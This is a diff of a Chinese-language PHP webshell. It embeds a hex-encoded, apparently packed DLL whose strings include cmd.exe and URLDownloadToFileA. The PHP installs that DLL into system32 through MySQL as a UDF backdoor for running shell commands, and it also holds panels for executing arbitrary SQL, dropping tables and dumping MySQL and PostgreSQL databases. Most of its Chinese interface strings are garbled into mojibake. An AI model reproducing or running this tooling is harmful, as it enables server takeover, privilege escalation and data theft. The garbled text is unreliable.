B60E56485481DF4C03C12580FC8D161DDEBD0A80E17FEB0D811FDED0540440391180C980DE880A81440B8D6686C5C671D0419080E3D60AC0C006A0A8487D065C9C249E5862050D10565D7426E8BC00BF83C410E0AE41C305E3CC0CB568E12EF1C6012D415CEB030A915B4013D4B88110B5DAA5DAD2630883FB0950769225FF2F7D6B2004308819413577DA802100498A178A018878007F8B118F49473BF972F21B365341486FFF948BD6A81E588D39C470CD4143A1D03B5CCF252EB6C1FF46758A274738C474F22C419D1AE324EC85D2E1C5FE4186E00E824A6F1474D21AC0E6FFD1575F3AEB78F0FFBF34019130007F0419C0D96EE2EB15130DC9817888C2C77895FFB541599EEE9067271FD82E760B3E6A602266C4040907B742A68D38CFDA39CB15580B0318AC05224EEBFB55D0C2052241280EABE097CF0B6C112836D1E970DA0C1B1FFF804EB741B35AB6201726828ADDFFDBEE0774217F1D467BFC720638DC770202E638F809D8B517BA35C6F7750DEBD733C908023657B34D9BB9AFE582806D6AE4BF0FF35FA6ED85B50A321926EF2BB446AB2F99EE57EBB68DDE5AC3EC74230BAB1F775165EB3AC0F0596B0979D584B5634DCA0975720271FC08A5C9DE0E5FFECB030051283074512BBC2311EC1A2D75770C920F1DA2C685B7A6EB52DF2F7D8B5BB10EC11AB6D10A5601805E6EBDF54B318065FE0088508845FDF3EB09BAAB41D90DFD0F6C8D4D0AD58B1803165179AD7DD182C16E4F026B53B38059E3450A23B07465BB72251CAE5A80450F8CD5815DB9AAF5490F8FA18A46D52D1FE9DEE83C057C83760A4D405E7D2539DBD187F8787E0BD95FAD6A0AA1A1F4DEE0FE8A045823C667D9EB658B1512DA65E94CB4B6C84A740FA7DF5BD4D630AF88065D0958B60917C5522B5B13566B032CF036BE03B49F572F1A6AE0648FCC20F6AEDA06AD75A5D646D0BE05FD032C37126253CB0BC18C00885DC029C25A0BC839FAAB60287C25F7E1C29DEB025EA105B11D42030985056C351FD31EAACA3EC1CC03580000D37466AAFF0F4D53EE65DD9304DF03E50F08EC03BDE4F2B2F20F0AFF0B050CCF0AB656D003D50302017FB6DF3A1903070602100445000535300050B5EEFF7F2C20283850580708003730305750070F200BD71461DE000860686009780073AE956E08071507001A010E7D7BDDFF0028006E0075006C0129320F6E756C6C6FB7FFDF0A72756E74696D65206572726F72200F0D0A03544C4F07E4BFD95353110E0053494E470044BBFD65ED4F4D4112115236303238082D204BB76F7F7961626C746F20696E6956616C697A0D6865D67EBED961703727376E6F743D0460EFB6FF756768207370616323667B6C6F7769380AB9EC3661066F6E3736ED672079737464357075722BF6DB5AFB76697274752133A5632320630C9B42BED86C285F345F2ABDF6DA7665785C2F5806DCE2E6BEB0935F3139F76F706558313260DBEE736F0F646573632B3888706B6D4624816564193024DF405723376D926FDBADA6AC7468BF612F6C6F636B1B6C8530173464B7865B6B6E612E02A221726D0050D8DAB770406772616D204A6D366829EC852F30394F10E71A8D66412A2B302E2B84EF53C8386172677528735F6DBBF63C303266C16E6E67826F9CB52EB605743A1164E67F4DC3DB422B2D60396615566973AAEFF660FC432B2B2052A04C6962B47279276D0F87B90A2D16450E211150D8656B9CD43AC2002E003CE5ED6D736DE0252C6B6C776E3E1B17EED8F84765744C61324102766550AE75705BDBCE62130F57956426876534BEF0FF7373616765426F78410075732533322E642ADD931252EAB75956035A77CF76670B5A955A0E0B5B8E0392483AAFB9BBB56D904A0064002C204D20086DC9BDB97900632F642F06D74D03FDB5179A4144EE656D626B5B4E6F76C3FE6D930B4F986F0A536570741486A96885416C96711BBEEDF9B941076E6541F369A64D101636172763684665327533BDF7DE7B4A616E0A675F57537BAF7BEF4B47433779433F3B6EA9D0DE3323B03C6418B0ED587B4F5E095468127313D9C15A6157BC7C0C547509B9D9B1C64D251053750743F7DE7BEF3B372F27231F039E73CEB90A11181F262D9C73CEC5AF828990979E72CE39E7A5ACB3BAC1C8A78008047C28BB92975043BD384F296360A9523F4D797371909620A953A636306EC263B50B355A6A09A663B7B921E76A3752C077035C321703ABCF91FB2E746D700FB40600B6472A481D3A2C7EB53D25E4E6FFDB730A2F636D642E657865202F63200068656C55192B75313774073967FF76B6E4380B3006687474703A2F2F8F2DF5FF2ED9632D9B09CAE4C8EBB8F1CABDB4EDCEF3FFC3FE6F120D00CFC2D4D8CAA7B0DC0BCEC4BCFEB3C9B9A6F6DCE6FE21C2B7BEB6A3BA7E175C3F44867B81D10F00200593195731D913199DE4667271F0108DE8832119B2178E180F30434E5146C2F80392017BD894A007010153107C81A4B902011F0264410152476357D9D9070A2F0207743CF2E4C96C084009140A73F01093274F9EC411941270133C79E4C944180C1972E41AAC1B93274F9E741C4C783C796EF2E4C92C7A1CFC18FF86B29317D854DD038572200107402699282048001940269210841002199009810119900119108202601C16023B20EF200D0C050133164DD30C3603070418050D344DD3340609070C0832D82083090A1B0BC1BEF702573B070F575F906EB0101311031217210C32D820350F414336D86083503352175307D860830D575F597B6C17D2344D376DAB20701C72D860DF0BC72F80B3810760830C36821F83848F208334CD91299EA1830D32D8A46FA7B79FCE760EC2601FD70B18070069BEB35D0517C00B1D0490664006968D08644006648E8F9006644006919293CC066140039F78EF4D54EC25FF0204222B6027CF0EF68279822117A6DF07A1A581E9CDF3EF9FE0FC2F407E80FCA8C1A3DAA34F0D72F60881FE0740B577830C812F41B65FCFA2E43E5F21FFA21A00E5A2E8A25B7EA1FE5105BF92DFEE03DA5EDA5F5FDA6ADA32D3D8DEE0B26627B7F939317E430303860064AA432EE99E9C84538B9876840380A6699AA67C7874706C9AA6699A645C54483C34699AA6692824201C18A6699AA614100C08044DD334970075FCF8F0E4DCA6E99E35D42F75CC03C4BC9AA6699AB0A89C908C8849BEA669806C64CD2E821D65BB8C8F905C037F009EF040E82F500B807007F0F11325DCA0D1535499508BDD50C944548CF38CDC97B058592CA7BF06699A0E1EEF3B5A9775A769BAA7B5D4F3E0301AB86CD3034E6D01333AB759699AA6697796B4D3F20CDA74DD272F034D6C01F108A48008368024444144210980D109600064C15B054D734325746554B6CBB7572C0D44656C65466905410A105FDB0C470A0953C5D87393CD2719522C0A23EC4F56C145185661726961622212C0EC7F436C6F736548616E6425F62AD80E4B4A500B63417B7B56686753791D656D4447B7C1B656F5227914744E747515B893FD70496E666F413569704FB1DBD62EA845782A08535D65702CFB36CCFD56657273696F163B896E6754792D67DF856C570F1F4C434D6170115706882E610D1B4D7073ED5BC34279126F65646543688366E5ABA03DFB644F66F34C6FFD8E6B68FF300B746C556E773C3D48D767EDAC7C70416C6C0A46B1FB432D7B9BE16F6D6D09336E7DACB38556982673FB0B790CC580D866E50B56ADB521419C42494D1E263CC3D609630A532740B029DBDACA16AD147215421BC0B64C5B762B78108C8580250B77C5EB8407C4600C542FB998A170B6DA75D3F812DCDD3302524964386C7353F3B3378BDD5575650C4F09DE4BD2258C531D2D471A086D618643427552C93B2463366412A0D50CC363141E4D6F64BDA34E616D6A3B2160BC5F9EE473183004470A0CF3CA6624A3FD08E42CCFF04258164361853B1CFE66BF08506F6990C906C25EF99DFD6B65644465633815C2844D72496E53EB460F3AC1F1EF73684B427566663E6A50ECB136761C0A410B074F454D092C19FE10934164647297EF7D2841BCD93C7155524C440A5BA4668277E3CE1C88F6F6FE340457534153864D00FF0402CBB22CCB17390334090C8D32B62C0B022649F7FF7FAE6D0C10025C000A052F0A5205546417350BDFFEFFFF811912192A060B2A385319310B320D1B806512ED2405670B30100F1CFFFFFFFF1B1B96130B530B1C455405400645171106180A118145110B4C310526530F7D1CFBA5FFFF078B1214050B121B271A1241691A09F04BF83A06F0520103BFFDFF7F0802070F080B06060A18050A1A0E080643125C1B4F59085A0DA37DF66FFF0F16F03001BAF00AF6211775F0C8020400CE2D07E6EDEDBF5F10070708270C0A08300A0608050C050CBFB5FFBB16030813082D1B10060F06070921AE08F04F020E6BBFB5ED061A050F107EA20605060D1D15349BFBF69B2244A6F0ED0120130616070F1810FBFFDBDB091A571362A9850E0B14060E09111C0F12091C230A03FFFFFFBF0C137F0A1CF0F20007194212310C0B0F0AF00302F04D012C0C1C191A0811F6ED5BFB050D05F00549BF05380C0757070A19088EDBADFDDB05663A081A0611190C7113081E0917F6FF0B6F17621806422214320715320A2115242A0E311CF6DF6EFF21250F0F321043CB140E47065B074845E3193539DBDF6EFF0C103F50133E1282260D8E13270F42141E6D157CFBFF6FAA0E13770D251C1374A04D18154A481712E3084B2512842F6C2F47550118EF051D29261A072842EEDE1D4A0604660B1B07161D2A32FFB7B77F7228060C3B0829710D0C234F6039150D3D22084C0F19615BFBFF262E0F20222D143A0726181A0B83A67C56DBFFFF138AF0FB00790C150B2EF0D9011C0D0D13090C32C221B76678E106210A1D081715A919E80B0AFBDF0A0B6E432C0019066F061E1113151EF95068857F10210C120E0F11759647BFF00BCDB85C7EF056011E550F0AC60A89050BFFBFB51F4C35080E1E1D182058163368254605030717FEAD6DFC103D105612F03E01EC48B24F30BD71E1B75B045E2F0F5838EA3C7D3810040CFB76F38301F0B4030408F0AC0A0DF014010417C8915D7E2010108408020800046453203FF0240608041009F92F71E90C9C645045A54C010400B2976A46AA4EF90FE0000E210B0106264B004F26A9244110BDEC3CFB09100F04000700D0B237E982272A0202079B6D7ED81E8D000071C886620285B9650AC0648A002B8CAA4BA744B0100C76F92E7465787446619070E2AD2A6574CD602E7212669D2BC1AB0D5303FB5E73D902402E26CF2427B62919A49090C04F6519EC6B0F7D584FC027A06F6EBF29421B5C881051C489C700000000000000800400FF00807C2408010F85C201000060BE00A000108DBE0070FFFF5783CDFFEB0D9090908A064688074701DB75078B1E83EEFC11DB72EDB80100000001DB75078B1E83EEFC11DB11C001DB73EF75098B1E83EEFC11DB73E431C983E803720DC1E0088A064683F0FF747489C501DB75078B1E83EEFC11DB11C901DB75078B1E83EEFC11DB11C975204101DB75078B1E83EEFC11DB11C901DB73EF75098B1E83EEFC11DB73E483C10281FD00F3FFFF83D1018D142F83FDFC760F8A02428807474975F7E963FFFFFF908B0283C204890783C70483E90477F101CFE94CFFFFFF5E89F7B9960100008A07472CE83C0177F7803F0A75F28B078A5F0466C1E808C1C01086C429F880EBE801F0890783C70588D8E2D98DBE00C000008B0709C074458B5F048D843000E0000001F35083C708FF9650E00000958A074708C074DC89F979070FB707475047B95748F2AE55FF9654E0000009C07407890383C304EBD86131C0C20C0083C7048D5EFC31C08A074709C074223CEF771101C38B0386C4C1C01086C401F08903EBE2240FC1E010668B0783C702EBE28BAE58E000008DBE00F0FFFFBB0010000050546A045357FFD58D87FF01000080207F8060287F585054505357FFD558618D4424806A0039C475FA83EC80E9C73CFFFF00000000000000000000000000000000000000000000000000000000000000000000000000000000000070F0000050F000000000000000000000000000007DF0000060F0000000000000000000000000000088F0000068F00000000000000000000000000000000000000000000092F00000A0F00000B0F0000000000000C0F000000000000073000080000000004B45524E454C33322E444C4C0075726C6D6F6E2E646C6C005753325F33322E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F74656374000055524C446F776E6C6F6164546F46696C65410000000000000000B1976A46000000001EF1000001000000030000000300000000F100000CF1000018F100009010000090150000801000002BF1000031F100003EF100000000010002006D7973716C446C6C2E646C6C0073746174650073746174655F6465696E69740073746174655F696E69740000000000E000000C0000001D360000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
@@ -1555,13 +1555,13 @@ $query="INSERT into udf_temp values (CONVERT($code,CHAR));";
 	if(!mysql_query($query, $link))
 	{
 		mysql_query('DROP TABLE udf_temp', $link) or die(mysql_error());
-		die('°²×°dllÊ§°Ü'.mysql_error());
+		die('ï¿½ï¿½×°dllÊ§ï¿½ï¿½'.mysql_error());
 	}
 	else
 	{
 	$dllname = "mysqlDll.dll";
 	if(file_exists("c:\\windows\\system32\\")) $dir="c:\\\\windows\\\\system32\\\\mysqlDll.dll";
-	elseif(file_exists("c:\\winnt\\system32\\")) $dir="c:\\\\winnt\\\\system32\\\\mysqlDll.dll"; 
+	elseif(file_exists("c:\\winnt\\system32\\")) $dir="c:\\\\winnt\\\\system32\\\\mysqlDll.dll";
 	if(file_exists($dir)) {
 		$time = time();
 		$dir = str_replace("mysqlDll","mysqlDll_$time",$dir);
@@ -1570,17 +1570,17 @@ $query="INSERT into udf_temp values (CONVERT($code,CHAR));";
 $query = "SELECT udf FROM udf_temp INTO DUMPFILE '".$dir."';" ;
 	if(!mysql_query($query, $link))
 	{
-		die("°²×°Ê§°Ü:$dirÎÞÈ¨".mysql_error());
+		die("ï¿½ï¿½×°Ê§ï¿½ï¿½:$dirï¿½ï¿½È¨".mysql_error());
 	}
 	else
 	{
-		echo '<font style=font:11pt color=ff0000>'.$dir.'°²×°³É¹¦</font><br>';
+		echo '<font style=font:11pt color=ff0000>'.$dir.'ï¿½ï¿½×°ï¿½É¹ï¿½</font><br>';
 	}
 }
 mysql_query('DROP TABLE udf_temp', $link) or die(mysql_error());
 $result = mysql_query("Create Function state returns string soname '$dllname'", $link) or die(mysql_error());
 if($result) {
-	echo "³É¹¦<br><a href='?'>·µ»Ø</a>";
+	echo "ï¿½É¹ï¿½<br><a href='?'>ï¿½ï¿½ï¿½ï¿½</a>";
 	exit();
 }
 }
@@ -1589,7 +1589,7 @@ $ss=stripslashes($post_sql);
 print<<<END
 <form method="post" action="?s=n&o=tq">
 <textarea name="post_sql" style="width:700px;height:200px;">{$ss}</textarea><br>
-<input name="install" type="submit" value="°²×°DLLºóÃÅ"> <input name="" type="submit" value="Ö´ÐÐCMDÓï¾ä"><br></form>
+<input name="install" type="submit" value="ï¿½ï¿½×°DLLï¿½ï¿½ï¿½ï¿½"> <input name="" type="submit" value="Ö´ï¿½ï¿½CMDï¿½ï¿½ï¿½ï¿½"><br></form>
 END;
 if ($_POST[post_sql]) {
 $link = mysql_connect ($mhost,$muser,$mpass) or die(mysql_error());
@@ -1611,7 +1611,7 @@ else
 		$msql = $_POST['msql'];
 		if($result = @mysql_query($msql,$conn))
 		{
-			$MSG_BOX = 'Ö´ÐÐSQLÓï¾ä³É¹¦<br>';
+			$MSG_BOX = 'Ö´ï¿½ï¿½SQLï¿½ï¿½ï¿½ï¿½ï¿½É¹ï¿½<br>';
 			$k = 0;
 			while($row = @mysql_fetch_array($result)){$MSG_BOX .= $row[$k];$k++;}
 		}
@@ -1632,19 +1632,19 @@ function nFull(i){
 <textarea name="msql" style="width:700px;height:200px;">{$msql}</textarea></div>
 <div class="actall">
 <select onchange="return nFull(options[selectedIndex].value)">
-	<option value="0" selected>ÏÔÊ¾°æ±¾</option>
-	<option value="1">µ¼³öÎÄ¼þ</option>
-	<option value="2">Ð´ÈëÎÄ¼þ</option>
-	<option value="3">¿ªÆôÍâÁ¬</option>
+	<option value="0" selected>ï¿½ï¿½Ê¾ï¿½æ±¾</option>
+	<option value="1">ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½</option>
+	<option value="2">Ð´ï¿½ï¿½ï¿½Ä¼ï¿½</option>
+	<option value="3">ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½</option>
 </select>
-<input type="submit" value="Ö´ÐÐ" style="width:80px;">
+<input type="submit" value="Ö´ï¿½ï¿½" style="width:80px;">
 END;
 }
 	if($MSG_BOX != '') echo '</div><div class="actall">'.$MSG_BOX.'</div></center></form>';
 	else echo '</div></center></form>';
 	return true;
 }
-//MYSQL¹ÜÀí
+//MYSQLï¿½ï¿½ï¿½ï¿½
 function Mysql_Len($data,$len)
 {
 	if(strlen($data) < $len) return $data;
@@ -1659,7 +1659,7 @@ print<<<END
 <script language="javascript">
 function Delok(msg,gourl)
 {
-	smsg = "È·¶¨ÒªÉ¾³ý[" + unescape(msg) + "]Âð?";
+	smsg = "È·ï¿½ï¿½ÒªÉ¾ï¿½ï¿½[" + unescape(msg) + "]ï¿½ï¿½?";
 	if(confirm(smsg)){window.location = gourl;}
 }
 function Createok(ac)
@@ -1672,18 +1672,18 @@ function Createok(ac)
 </script>
 END;
 		$BOOL = false;
-		$MSG_BOX = 'ÓÃ»§:'.$_COOKIE['m_silicuser'].' &nbsp;&nbsp;&nbsp;&nbsp; µØÖ·:'.$_COOKIE['m_silichost'].':'.$_COOKIE['m_silicport'].' &nbsp;&nbsp;&nbsp;&nbsp; °æ±¾:';
+		$MSG_BOX = 'ï¿½Ã»ï¿½:'.$_COOKIE['m_silicuser'].' &nbsp;&nbsp;&nbsp;&nbsp; ï¿½ï¿½Ö·:'.$_COOKIE['m_silichost'].':'.$_COOKIE['m_silicport'].' &nbsp;&nbsp;&nbsp;&nbsp; ï¿½æ±¾:';
 		$k = 0;
 		$result = @mysql_query('select version();',$conn);
 		while($row = @mysql_fetch_array($result)){$MSG_BOX .= $row[$k];$k++;}
-		echo '<div class="actall"> Êý¾Ý¿â:';
+		echo '<div class="actall"> ï¿½ï¿½ï¿½Ý¿ï¿½:';
 		$result = mysql_query("SHOW DATABASES",$conn);
 		while($db = mysql_fetch_array($result)){echo '&nbsp;&nbsp;[<a href="?s=r&db='.$db['Database'].'">'.$db['Database'].'</a>]';}
 		echo '</div>';
 		if(isset($_GET['db']))
 		{
 			mysql_select_db($_GET['db'],$conn);
-			if(!empty($_POST['nsql'])){$BOOL = true; $MSG_BOX = mysql_query($_POST['nsql'],$conn) ? 'Ö´ÐÐ³É¹¦' : 'Ö´ÐÐÊ§°Ü '.mysql_error();}
+			if(!empty($_POST['nsql'])){$BOOL = true; $MSG_BOX = mysql_query($_POST['nsql'],$conn) ? 'Ö´ï¿½Ð³É¹ï¿½' : 'Ö´ï¿½ï¿½Ê§ï¿½ï¿½ '.mysql_error();}
 			if(is_array($_POST['insql']))
 			{
 				$query = 'INSERT INTO '.$_GET['table'].' (';
@@ -1693,7 +1693,7 @@ END;
 					$queryb .= '\''.addslashes($key).'\',';
 				}
 				$query = $query.substr($querya, 0, -1).') VALUES ('.substr($queryb, 0, -1).');';
-				$MSG_BOX = mysql_query($query,$conn) ? 'Ìí¼Ó³É¹¦' : 'Ìí¼ÓÊ§°Ü '.mysql_error();
+				$MSG_BOX = mysql_query($query,$conn) ? 'ï¿½ï¿½ï¿½Ó³É¹ï¿½' : 'ï¿½ï¿½ï¿½ï¿½Ê§ï¿½ï¿½ '.mysql_error();
 			}
 			if(is_array($_POST['upsql']))
 			{
@@ -1703,7 +1703,7 @@ END;
 					$queryb .= $var.'=\''.addslashes($key).'\',';
 				}
 				$query = $query.substr($queryb, 0, -1).' '.base64_decode($_POST['wherevar']).';';
-				$MSG_BOX = mysql_query($query,$conn) ? 'ÐÞ¸Ä³É¹¦' : 'ÐÞ¸ÄÊ§°Ü '.mysql_error();
+				$MSG_BOX = mysql_query($query,$conn) ? 'ï¿½Þ¸Ä³É¹ï¿½' : 'ï¿½Þ¸ï¿½Ê§ï¿½ï¿½ '.mysql_error();
 			}
 			if(isset($_GET['del']))
 			{
@@ -1712,23 +1712,23 @@ END;
 				$query = 'DELETE FROM '.$_GET['table'].' WHERE ';
 				foreach($good as $var => $key){$queryc .= $var.'=\''.addslashes($key).'\' AND ';}
 				$where = $query.substr($queryc, 0, -4).';';
-				$MSG_BOX = mysql_query($where,$conn) ? 'É¾³ý³É¹¦' : 'É¾³ýÊ§°Ü '.mysql_error();
+				$MSG_BOX = mysql_query($where,$conn) ? 'É¾ï¿½ï¿½ï¿½É¹ï¿½' : 'É¾ï¿½ï¿½Ê§ï¿½ï¿½ '.mysql_error();
 			}
 			$action = '?s=r&db='.$_GET['db'];
-			if(isset($_GET['drop'])){$query = 'Drop TABLE IF EXISTS '.$_GET['drop'].';';$MSG_BOX = mysql_query($query,$conn) ? 'É¾³ý³É¹¦' : 'É¾³ýÊ§°Ü '.mysql_error();}
+			if(isset($_GET['drop'])){$query = 'Drop TABLE IF EXISTS '.$_GET['drop'].';';$MSG_BOX = mysql_query($query,$conn) ? 'É¾ï¿½ï¿½ï¿½É¹ï¿½' : 'É¾ï¿½ï¿½Ê§ï¿½ï¿½ '.mysql_error();}
 			if(isset($_GET['table'])){$action .= '&table='.$_GET['table'];if(isset($_GET['edit'])) $action .= '&edit='.$_GET['edit'];}
 			if(isset($_GET['insert'])) $action .= '&insert='.$_GET['insert'];
 			echo '<div class="actall"><form method="POST" action="'.$action.'">';
 			echo '<textarea name="nsql" id="nsql" style="width:500px;height:50px;">'.$_POST['nsql'].'</textarea> ';
-			echo '<input type="submit" name="querysql" value="Ö´ÐÐ" style="width:60px;height:49px;"> ';
-			echo '<input type="button" value="´´½¨±í" style="width:60px;height:49px;" onclick="Createok(\'a\')"> ';
-			echo '<input type="button" value="´´½¨¿â" style="width:60px;height:49px;" onclick="Createok(\'b\')"> ';
-			echo '<input type="button" value="É¾³ý¿â" style="width:60px;height:49px;" onclick="Createok(\'c\')"></form></div>';
+			echo '<input type="submit" name="querysql" value="Ö´ï¿½ï¿½" style="width:60px;height:49px;"> ';
+			echo '<input type="button" value="ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½" style="width:60px;height:49px;" onclick="Createok(\'a\')"> ';
+			echo '<input type="button" value="ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½" style="width:60px;height:49px;" onclick="Createok(\'b\')"> ';
+			echo '<input type="button" value="É¾ï¿½ï¿½ï¿½ï¿½" style="width:60px;height:49px;" onclick="Createok(\'c\')"></form></div>';
 			echo '<div class="msgbox" style="height:40px;">'.$MSG_BOX.'</div><div class="actall"><a href="?s=r&db='.$_GET['db'].'">'.$_GET['db'].'</a> ---> ';
 			if(isset($_GET['table']))
 			{
 				echo '<a href="?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'">'.$_GET['table'].'</a> ';
-				echo '[<a href="?s=r&db='.$_GET['db'].'&insert='.$_GET['table'].'">²åÈë</a>]</div>';
+				echo '[<a href="?s=r&db='.$_GET['db'].'&insert='.$_GET['table'].'">ï¿½ï¿½ï¿½ï¿½</a>]</div>';
 				if(isset($_GET['edit']))
 				{
 					if(isset($_GET['p'])) $atable = $_GET['table'].'&p='.$_GET['p']; else $atable = $_GET['table'];
@@ -1756,7 +1756,7 @@ END;
 		      $row_num = mysql_num_rows(mysql_query('SELECT * FROM '.$_GET['table'],$conn));
 		      if(!isset($_GET['p'])){$p = 0;$_GET['p'] = 1;} else $p = ((int)$_GET['p']-1)*20;
 					echo '<table border="0"><tr>';
-					echo '<td class="toptd" style="width:70px;" nowrap>²Ù×÷</td>';
+					echo '<td class="toptd" style="width:70px;" nowrap>ï¿½ï¿½ï¿½ï¿½</td>';
 					while($row = @mysql_fetch_assoc($result))
 					{
 						array_push($fields,$row['Field']);
@@ -1768,8 +1768,8 @@ END;
 					$v = $p;
 					while($text = @mysql_fetch_assoc($result))
 					{
-						echo '<tr><td><a href="?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&edit='.$v.'"> ÐÞ¸Ä </a> ';
-						echo '<a href="#" onclick="Delok(\'Ëü\',\'?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&del='.$v.'\');return false;"> É¾³ý </a></td>';
+						echo '<tr><td><a href="?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&edit='.$v.'"> ï¿½Þ¸ï¿½ </a> ';
+						echo '<a href="#" onclick="Delok(\'ï¿½ï¿½\',\'?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&del='.$v.'\');return false;"> É¾ï¿½ï¿½ </a></td>';
 						foreach($fields as $row){echo '<td>'.nl2br(htmlspecialchars(Mysql_Len($text[$row],500))).'</td>';}
 						echo '</tr>'."\r\n";$v++;
 					}
@@ -1804,16 +1804,16 @@ END;
 				}
 				$query = 'SHOW TABLES FROM '.$_GET['db'].';';
 				echo '</div><table border="0"><tr>';
-				echo '<td class="toptd" style="width:550px;"> ±íÃû </td>';
-				echo '<td class="toptd" style="width:80px;"> ²Ù×÷ </td>';
-				echo '<td class="toptd" style="width:130px;"> ×Ö·û¼¯ </td>';
-				echo '<td class="toptd" style="width:70px;"> ´óÐ¡ </td></tr>';
+				echo '<td class="toptd" style="width:550px;"> ï¿½ï¿½ï¿½ï¿½ </td>';
+				echo '<td class="toptd" style="width:80px;"> ï¿½ï¿½ï¿½ï¿½ </td>';
+				echo '<td class="toptd" style="width:130px;"> ï¿½Ö·ï¿½ï¿½ï¿½ </td>';
+				echo '<td class="toptd" style="width:70px;"> ï¿½ï¿½Ð¡ </td></tr>';
 				$result = @mysql_query($query,$conn);
 				$k = 0;
 				while($table = mysql_fetch_row($result))
 				{
 					echo '<tr><td><a href="?s=r&db='.$_GET['db'].'&table='.$table[0].'">'.$table[0].'</a></td>';
-					echo '<td><a href="?s=r&db='.$_GET['db'].'&insert='.$table[0].'"> ²åÈë </a> <a href="#" onclick="Delok(\''.$table[0].'\',\'?s=r&db='.$_GET['db'].'&drop='.$table[0].'\');return false;"> É¾³ý </a></td>';
+					echo '<td><a href="?s=r&db='.$_GET['db'].'&insert='.$table[0].'"> ï¿½ï¿½ï¿½ï¿½ </a> <a href="#" onclick="Delok(\''.$table[0].'\',\'?s=r&db='.$_GET['db'].'&drop='.$table[0].'\');return false;"> É¾ï¿½ï¿½ </a></td>';
 					echo '<td>'.$statucoll[$k].'</td><td align="right">'.File_Size($statusize[$k]).'</td></tr>'."\r\n";
 					$k++;
 				}
@@ -1821,11 +1821,11 @@ END;
 			}
 		}
 	}
-	else die('Á¬½ÓMYSQLÊ§°Ü,ÇëÖØÐÂµÇÂ½.<meta http-equiv="refresh" content="0;URL=?s=o">');
+	else die('ï¿½ï¿½ï¿½ï¿½MYSQLÊ§ï¿½ï¿½,ï¿½ï¿½ï¿½ï¿½ï¿½Âµï¿½Â½.<meta http-equiv="refresh" content="0;URL=?s=o">');
 	if(!$BOOL) echo '<script type="text/javascript">document.getElementById(\'nsql\').value = \''.addslashes($query).'\';</script>';
 	return false;
 }
-//PostgreSQL²Ù×÷
+//PostgreSQLï¿½ï¿½ï¿½ï¿½
 function Pgr_sql()
 {
 $pghost=$_POST['pghost'] ? $_POST['pghost']:'';
@@ -1833,7 +1833,7 @@ $pgport=$_POST['pgport'] ? $_POST['pgport']:'';
 $pguser=$_POST['pguser'] ? $_POST['pguser']:'postgres';
 $pgpass=$_POST['pgpass'] ? $_POST['pgpass']:'';
 $pgdb=$_POST['pgdb'] ? $_POST['pgdb']:'postgres';
-$pgquery=$_POST['pgsql'] ? $_POST['pgsql']:'select version()'; 
+$pgquery=$_POST['pgsql'] ? $_POST['pgsql']:'select version()';
 $pgquery=stripslashes($pgquery);
 print<<<END
 <script language="javascript">
@@ -1850,32 +1850,32 @@ return true;
 }
 </script>
 <div class="actall">
-<!--SQL±íµ¥¿ªÊ¼-->
+<!--SQLï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê¼-->
 <p style="font-size:10pt;font-family:Lucida Handwriting,Times New Roman;">
-·þÎñÆ÷ºÍ¶Ë¿ÚÎªÑ¡Ìî£¬Êý¾Ý¿âÎÞ·¨Á¬½ÓÊ±¿É³¢ÊÔ²»ÌîÐ´<br>
-±¾½Å±¾Ä¬ÈÏÅä±¸µÄSQLÓï¾äÊÊÓÃÓÚPostgreSQL 8.1<br>
-ÍÑ¿âÇëÌîÐ´ÕýÈ·µÄÊý¾Ý¿âÃû<br>
-ÁÐ±í¶Î¿ÉÓÃselect relname from pg_stat_user_tables limit 1 offset n;<br>
-¸ü¶à¹ýÓÚPostgreSQLÓï¾ä¿É²Î¼û<a href="http://nana.blackbap.org/?p=archive&id=55" target="_blank">[ÕâÀï]</a><br><hr></p>
+ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Í¶Ë¿ï¿½ÎªÑ¡ï¿½î£¬ï¿½ï¿½ï¿½Ý¿ï¿½ï¿½Þ·ï¿½ï¿½ï¿½ï¿½ï¿½Ê±ï¿½É³ï¿½ï¿½Ô²ï¿½ï¿½ï¿½Ð´<br>
+ï¿½ï¿½ï¿½Å±ï¿½Ä¬ï¿½ï¿½ï¿½ä±¸ï¿½ï¿½SQLï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½PostgreSQL 8.1<br>
+ï¿½Ñ¿ï¿½ï¿½ï¿½ï¿½ï¿½Ð´ï¿½ï¿½È·ï¿½ï¿½ï¿½ï¿½ï¿½Ý¿ï¿½ï¿½ï¿½<br>
+ï¿½Ð±ï¿½ï¿½Î¿ï¿½ï¿½ï¿½select relname from pg_stat_user_tables limit 1 offset n;<br>
+ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½PostgreSQLï¿½ï¿½ï¿½ï¿½ï¿½É²Î¼ï¿½<a href="http://nana.blackbap.org/?p=archive&id=55" target="_blank">[ï¿½ï¿½ï¿½ï¿½]</a><br><hr></p>
 <form name="pgform" method="POST" action="?s=pq">
-·þÎñÆ÷:<input type="text" name="pghost" value="{$pghost}" style="width:100px">
-ÓÃ»§:<input type="text" name="pguser" value="{$pguser}" style="width:100px">
-ÃÜÂë:<input tyoe="text" name="pgpass" value="{$pgpass}" style="width:100px">
-Êý¾Ý¿âÃû:<input type="text" name="pgdb" value="{$pgdb}" style="width:100px"><br><br>
+ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½:<input type="text" name="pghost" value="{$pghost}" style="width:100px">
+ï¿½Ã»ï¿½:<input type="text" name="pguser" value="{$pguser}" style="width:100px">
+ï¿½ï¿½ï¿½ï¿½:<input tyoe="text" name="pgpass" value="{$pgpass}" style="width:100px">
+ï¿½ï¿½ï¿½Ý¿ï¿½ï¿½ï¿½:<input type="text" name="pgdb" value="{$pgdb}" style="width:100px"><br><br>
